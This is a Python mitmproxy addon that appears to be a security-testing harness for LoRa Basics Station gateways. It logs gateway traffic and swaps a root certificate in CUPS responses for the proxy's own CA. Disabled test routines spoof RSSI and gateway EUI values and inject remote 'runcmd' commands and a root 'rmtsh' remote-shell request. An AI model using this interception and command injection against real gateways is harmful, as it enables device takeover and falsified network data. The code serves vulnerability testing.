import json
import time
from mitmproxy import http, ctx
import os
from enum import Enum

class Test(Enum):
    spoofRssi = 'spoofRssi'
    spoofDevAddr ='spoofDevAddr'
    spoofDevEUI = 'spoofDevEUI'
    # https://doc.sm.tc/station/tcproto.html#remote-commands
    injectRCE= 'injectRCE'


class LNSInterceptor:
    root = '/home/mitmproxy'

    def __init__(self):
        try:
            # export paths
            self.requests_file_path = f'{self.root}/requests.json'
            self.wss_messages_file_path = f'{self.root}/wss_messages.json'

            # init files if don't exist
            self.init_file(self.requests_file_path)
            self.init_file(self.wss_messages_file_path)

            # open files in read write
            self.requests_file = open(self.requests_file_path, 'r+')
            self.wss_messages_file = open(self.wss_messages_file_path, 'r+')

        except Exception as e:
            ctx.log.info(f"[{self.timestamp_now()}] Error during LNSInterceptor initialization: {e}")

    def timestamp_now(self):
     return time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())

    def init_file(self, filepath):
        # init empty if don't exist
        if not os.path.exists(filepath):
            with open(filepath, 'w') as f:
                json.dump([], f)

    def append_to_file(self, file, data):
        # if exist already checked before
        file.seek(0, os.SEEK_END)
        file.seek(file.tell() - 1, os.SEEK_SET)
        file.write(',\n' + json.dumps(data, indent=4) + ']')
        file.flush()

    # handle http request
    def request(self, flow: http.HTTPFlow):
        content = flow.request.content
        # if json, do nothing, if not decode
        try:
            content = json.loads(content)
        except ValueError:
            content = flow.request.content.decode('utf-8', 'replace')


        timestamp = self.timestamp_now()

        if flow.websocket is None:
            request_info = {
                "timestamp": timestamp,
                "type": "http",
                "method": flow.request.method,
                "host": flow.request.host,
                "path": flow.request.path,
                "headers": dict(flow.request.headers),
                "content": content
            }

            # update file
            self.append_to_file(self.requests_file, request_info)
            ctx.log.info(f"[{timestamp}] Logged HTTP request to {flow.request.host}")
        else:
            # Handle the WebSocket upgrade request
            ctx.log.info(f"[{timestamp}] WebSocket upgrade request to {flow.request.host}")

    # handle wss messages stream
    def websocket_message(self, flow: http.HTTPFlow):
        if flow.websocket is not None:
            timestamp = self.timestamp_now()
            message = flow.websocket.messages[-1]
            
            try:
                content = json.loads(message.content)
            except json.JSONDecodeError:
                content = message.content.decode('utf-8', 'replace')

            # mess to add
            message_info = {
                "timestamp": timestamp,
                "type": "websocket",
                "direction": "sent" if message.from_client else "received",
                "content": content
            }

            # update file
            self.append_to_file(self.wss_messages_file, message_info)

            ctx.log.info(f"[{timestamp}] Logged WebSocket message from {'client' if message.from_client else 'server'}")

    # on obj destruct kill the filestream
    def __del__(self):
        self.requests_file.close()
        self.wss_messages_file.close()

class CUPSInterceptor:

    ca_cert_path = '/home/mitmproxy/mitmproxy-ca-cert.pem'

    def __init__(self) -> None:
        # load CA certificate content
        self.ca_cert_content = self.load_ca_cert_content()

    # as ttn seems to provide cert to gateway
    # this fnct will load it, then will erase on-the-fly response
    def load_ca_cert_content(self):
        try:
            with open(self.ca_cert_path, 'rb') as f:
                ca_cert_content = f.read()
                f.close()
            return ca_cert_content
        except Exception as e:
            timestamp = self.timestamp_now()
            ctx.log.info(f"[{timestamp}] Error loading CA certificate content: {e}")
            return b''


    def timestamp_now(self):
        return time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())

    # remove root certif if present in https response
    def response(self, flow: http.HTTPFlow):
        timestamp = self.timestamp_now()

        try:
            if 'content-type' in flow.response.headers:
                if flow.response.headers['content-type'] == 'application/octet-stream':
                    # verify the content to check
                    if b'ISRG Root X10' in flow.response.content:
                        ctx.log.info(f'Content of request before interception: {flow.response.content.hex()}')
                        flow.response.content = self.ca_cert_content
                        ctx.log.info(f"[{self.timestamp_now()}] ISRG Root X10 intercepted and erased")
        except Exception as e:
            ctx.log.info(f"[{timestamp}] Error processing HTTP response: {e}")


class TestSamples:
    def __init__(self)-> None:
        ctx.log.info(f"init Test Samples")
        self.other_gateway_eui = "24e1:24ff:fef8:0214"
        # the dev address from our device
        self.own_dev_address = 00000
        # the selected test to run
        self.selected_test = Test.spoofDevEUI
        # index used to move through the rce commands array
        self.rce_index = 0
        # commands to test for the Test.injectRCE
        self.rce_commands  = [
                        {"msgtype": "runcmd", "command": "mkdir", "arguments": ["/tmp/RCE_SUCCESS_0"]},
                        {"msgtype": "runcmd", "command": "mkdir /tmp/RCE_SUCCESS_1", "arguments": []},
                        # root@dragino-22af58:~# which mkdir
                        {"msgtype": "runcmd", "command": "/bin/mkdir", "arguments": ['/tmp/RCE_SUCCESS_2']},
                        {"msgtype": "runcmd", "command": "/bin/mkdir /tmp/RCE_SUCCESS_3", "arguments": ['']},
                        
                        # "stop":0  omitted based on doc if want to start a remote shell
                        {"msgtype": "rmtsh","user": "root","term": "xterm-256color","start":1}
                    ]
        # test that should be run
        self.test_functions = {
            Test.spoofRssi: self.spoof_rssi,
            Test.spoofDevEUI: self.spoof_dev_eui,
            Test.spoofDevAddr: self.spoof_dev_addr,
            Test.injectRCE: self.inject_rce
        }
        
    def get_property(self, data, property_path):
        #split all keys based on expected path
        keys = property_path.split('.')
        current_data = data
        
        for key in keys:
            # case of iterate over []
            if isinstance(current_data, list):
                key = int(key)
            current_data = current_data[key]
        return current_data

    def set_property(self, data, property_path, new_value):
        keys = property_path.split('.')
        current_data = data
        for key in keys[:-1]:
            # case of iterate over []
            if isinstance(current_data, list):
                key = int(key)
            current_data = current_data[key]
        final_key = keys[-1]
        if isinstance(current_data, list):
            final_key = int(final_key)
        current_data[final_key] = new_value
    

    def timestamp_now(self):
        return time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
    
    def websocket_message(self, flow: http.HTTPFlow):
        if flow.websocket is not None:
            if self.selected_test in self.test_functions:
                self.test_functions[self.selected_test](flow)
            else:
                ctx.log.info(f"No test function found for {self.selected_test.value}")

    # only for spoofDevEUI test as it is a https request and not a wss
    def request(self, flow: http.HTTPFlow):
        if self.selected_test == Test.spoofDevEUI:
            if flow.request.path == "/update-info" \
                and "application/json" in flow.request.headers.get("Content-Type", ""):
                try:
                    data = json.loads(flow.request.content)
                    data['router'] = self.other_gateway_eui
                    ctx.log.info(data)
                    flow.request.content = json.dumps(data).encode('utf-8')
                except json.JSONDecodeError:
                    pass
            

    def spoof_rssi(self, flow: http.HTTPFlow):

        timestamp = self.timestamp_now()
        message = flow.websocket.messages[-1]
    
        ctx.log.info(f"[{timestamp}] Executing: {self.selected_test.value} test")
    
        try:
            content = json.loads(message.content)
        except json.JSONDecodeError:
            content = message.content.decode('utf-8', 'replace')

        if message.from_client and flow.websocket is not None:
            try:
                rssi = self.get_property(content, 'upinfo.rssi')
                ctx.log.info(f"[{timestamp}] Dropping current message...")
                message.drop()
                # get the rssi from the json
                
                # modify the rssi and increase it
                spoofed_rssi = rssi + 2
                ctx.log.info(f"New rssi set, real value: {rssi}, injected rssi: {spoofed_rssi}")

                # reinject it in the json
                self.set_property(content, 'upinfo.rssi', spoofed_rssi)

                # encode the json
                new_content = json.dumps(content).encode('utf-8')
                #inject the content in the message
                ctx.master.commands.call("inject.websocket", flow, message.from_client,new_content)
            except Exception as e:
                ctx.log.error(f"An error occurred in {self.selected_test.value} test: {str(e)}")

            # todo: test seems not working as expected -> check if need to recompute some field or hash/crc

    def spoof_dev_eui(self, flow: http.HTTPFlow):
        ctx.log.info(f"Executing {self.selected_test.value} test")
        # intercept /router-info and replace the gateway config by a new one
        # this is the websocket part of the https then upgraded in wss. The /update-info is not here because is https only so must be handle in request mitmproxy handler
        if flow.request.path == "/router-info":
            message = flow.websocket.messages[-1]

            if message.from_client:
                message.drop()
                other_gateway_eui = {"router": self.other_gateway_eui}
                gateway_config = json.dumps(other_gateway_eui).encode('utf-8')
                ctx.master.commands.call("inject.websocket", flow, message.from_client, gateway_config)
                ctx.log.info(f"New config injected {other_gateway_eui}")
    # todo

    def spoof_dev_addr(self, flow: http.HTTPFlow):
        ctx.log.info(f"Executing {self.selected_test.value} test")
        # todo

    def inject_rce(self, flow: http.HTTPFlow):
        timestamp = self.timestamp_now()
        message = flow.websocket.messages[-1]
        if not message.from_client:
            message.drop()

            ctx.log.info(f"[{timestamp}] Executing: {self.selected_test.value} test, RCE command index: {self.rce_index}")

            command_bytes = json.dumps(self.rce_commands[self.rce_index]).encode('utf-8')

            self.rce_index += 1

            if self.rce_index >= len(self.rce_commands):
                self.rce_index = 0

            message.content = command_bytes
                    

# add the current logger as new addon on mitmproxy
# by default test sample is not enabled
addons = [LNSInterceptor(), CUPSInterceptor()]
